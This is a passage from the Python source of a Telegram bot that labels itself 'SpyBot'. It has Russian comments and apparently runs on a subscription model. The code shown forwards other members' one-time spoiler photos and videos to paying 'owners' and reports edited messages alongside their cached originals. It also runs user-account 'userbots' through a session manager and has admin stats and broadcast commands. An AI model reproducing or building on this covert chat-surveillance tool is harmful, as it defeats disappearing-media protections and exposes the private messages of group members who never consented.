    if getattr(message, "has_media_spoiler", False) and (message.photo or message.video):
        sender = message.from_user.full_name if message.from_user else "Аноним"
        title  = message.chat.title or str(message.chat.id)
        for uid in owners:
            try:
                await message.bot.send_message(uid,
                    f"🔥 <b>Одноразовое медиа</b>\n💬 Чат: <b>{title}</b>\n👤 От: <b>{sender}</b>")
                if message.photo:
                    await resend_media(message.bot, uid, "photo", message.photo[-1].file_id)
                elif message.video:
                    await resend_media(message.bot, uid, "video", message.video.file_id)
            except Exception as e:
                log.warning(f"spoiler notify failed for {uid}: {e}")

# ── изменённые сообщения ───────────────────────────────────────────────────

@router.edited_message(F.chat.type.in_({"group", "supergroup", "channel"}))
async def edited_message(message: Message):
    owners = await active_owners(message.chat.id)
    if not owners:
        return
    old = await db_get_cached(message.chat.id, message.message_id)
    old_text = (old.get("text") or "[медиа]") if old else "[нет в кеше]"
    new_text = message.text or message.caption or "[медиа]"
    sender = message.from_user.full_name if message.from_user else "Аноним"
    title  = message.chat.title or str(message.chat.id)
    for uid in owners:
        await notify_edited(message.bot, uid, title, sender, old_text, new_text)
    await db_cache_msg(message)

# ── админ ──────────────────────────────────────────────────────────────────

@router.message(Command("admin"), F.from_user.id == ADMIN_ID)
async def cmd_admin(message: Message):
    stats = await db_stats()
    await message.answer(
        f"🔧 <b>Администратор</b>\n\n"
        f"👥 Пользователей: <b>{stats['users']}</b>\n"
        f"💬 Чатов: <b>{stats['chats']}</b>\n"
        f"📦 Кешировано: <b>{stats['cached']}</b>\n"
        f"✅ Подписок: <b>{stats['active_subs']}</b>\n"
        f"🎁 Триалов: <b>{stats['trials']}</b>\n"
        f"📱 Юзерботов онлайн: <b>{len(sm._clients)}</b>"
    )

@router.message(Command("broadcast"), F.from_user.id == ADMIN_ID)
async def cmd_broadcast(message: Message, bot: Bot):
    text = message.text.replace("/broadcast", "").strip()
    if not text:
        await message.answer("Использование: /broadcast Текст")
        return
    users = await db_all_user_ids()
    ok = fail = 0
    for uid in users:
        try:
            await bot.send_message(uid, text)
            ok += 1
        except Exception:
            fail += 1
    await message.answer(f"📢 Рассылка: ✅{ok} / ❌{fail}")

# ══════════════════════════════════════════════════════════
#  ЗАПУСК
# ══════════════════════════════════════════════════════════

async def main():
    await db_init()

    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp  = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)

    sm.set_bot(bot)

    tasks = []

    if API_ID and API_HASH:
        await sm.restore_all()
        tasks.append(asyncio.create_task(sm.run_forever()))
        log.info("Session manager started")
    else:
        log.warning("API_ID/API_HASH не заданы — подключение аккаунтов недоступно")

    tasks.append(asyncio.create_task(
        dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    ))

    log.info("SpyBot запущен!")
    try:
        await asyncio.gather(*tasks)
    finally:
        await sm.shutdown()
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Остановлен")
